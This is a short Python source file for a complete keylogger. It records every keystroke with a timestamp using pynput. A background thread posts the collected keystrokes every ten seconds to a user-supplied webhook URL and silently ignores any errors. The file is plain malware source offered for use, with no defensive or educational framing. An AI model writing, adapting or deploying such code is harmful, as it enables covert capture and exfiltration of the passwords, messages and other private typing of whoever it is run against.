import pynput.keyboard
import threading
import datetime
import requests
import time

WEBHOOK_URL = "inputyourownwebhookhere"

log_buffer = []

def send_logs():
    while True:
        if log_buffer:
            data = {"content": "\n".join(log_buffer)}
            try:
                requests.post(WEBHOOK_URL, json=data)
            except:
                pass
            log_buffer.clear()
        time.sleep(10)

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key.name}]"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {key_str}"
    log_buffer.append(log_entry)

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    sender_thread = threading.Thread(target=send_logs, daemon=True)
    sender_thread.start()
    start_keylogger()
